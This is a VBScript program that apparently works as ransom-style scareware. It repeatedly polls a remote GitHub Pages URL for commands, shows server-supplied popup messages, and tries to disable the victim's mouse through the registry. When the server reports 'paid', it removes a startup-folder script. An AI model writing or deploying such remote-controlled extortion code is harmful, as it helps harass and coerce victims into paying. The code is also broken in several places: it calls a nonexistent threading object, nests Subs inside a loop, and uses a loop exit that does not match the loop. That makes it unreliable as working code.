Option Explicit

Dim delay
delay = 1 ' Delay between each execution (in seconds)

Dim url
url = "https://tanjim750.github.io/remotecontrol/" ' Replace with the URL of your website

Dim loopFlag
loopFlag = True

While loopFlag
    Dim response
    On Error Resume Next ' Ignore any errors during HTTP request
    Dim xmlhttp
    Set xmlhttp = CreateObject("MSXML2.ServerXMLHTTP")
    xmlhttp.Open "GET", url, False
    xmlhttp.Send
    response = xmlhttp.responseText
    On Error Goto 0 ' Turn off error handling
    
    If Err.Number = 0 Then
        Dim doc
        Set doc = CreateObject("HTMLFile")
        doc.write response
        
        Dim statusValue
        Dim statusInput
        Set statusInput = doc.getElementById("status")
        If Not statusInput Is Nothing Then
            statusValue = statusInput.value
        End If
        
        Dim text
        Dim textInput
        Set textInput = doc.getElementById("text")
        If Not textInput Is Nothing Then
            text = textInput.innerText
        End If
        
        If statusValue = "pending" Then
            Dim shell
            Set shell = CreateObject("WScript.Shell")
            
            Dim mouseDisabled
            mouseDisabled = False
            
            ' Function to display the message
            Sub DisplayMessage()
                shell.Popup text, 0, "Message", vbInformation
                
                ' Re-enable the mouse if it was disabled
                If mouseDisabled Then
                    shell.Run "C:\Windows\System32\reg.exe ADD HKCU\Control Panel\Desktop /v MouseTrail /t REG_SZ /d 0 /f", 0, True
                End If
            End Sub
            
            ' Function to disable the mouse
            Sub DisableMouse()
                mouseDisabled = True
                shell.Run "C:\Windows\System32\reg.exe ADD HKCU\Control Panel\Desktop /v MouseTrail /t REG_SZ /d -1 /f", 0, True
            End Sub
            
            ' Run the DisplayMessage and DisableMouse functions in separate threads
            Dim displayThread
            Set displayThread = CreateObject("Scripting.Thread")
            displayThread.CodeObject = GetRef("DisplayMessage")
            displayThread.Start
            
            Dim disableMouseThread
            Set disableMouseThread = CreateObject("Scripting.Thread")
            disableMouseThread.CodeObject = GetRef("DisableMouse")
            disableMouseThread.Start
        ElseIf statusValue = "loop" Then
            loopFlag = True
        ElseIf statusValue = "donotexecute" Then
            loopFlag = False
        ElseIf statusValue = "paid" Then
            Dim fso
            Set fso = CreateObject("Scripting.FileSystemObject")
            Dim startupPath
            startupPath = shell.ExpandEnvironmentStrings("%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup")
            Dim startupScriptPath
            startupScriptPath = fso.BuildPath(startupPath, "startapp.vbs")
            If fso.FileExists(startupScriptPath) Then
                fso.DeleteFile startupScriptPath
            End If
            Exit Do
        Else
            loopFlag = True
        End If
    End If
    
    WScript.Sleep delay * 1000 ' Delay in milliseconds
Wend
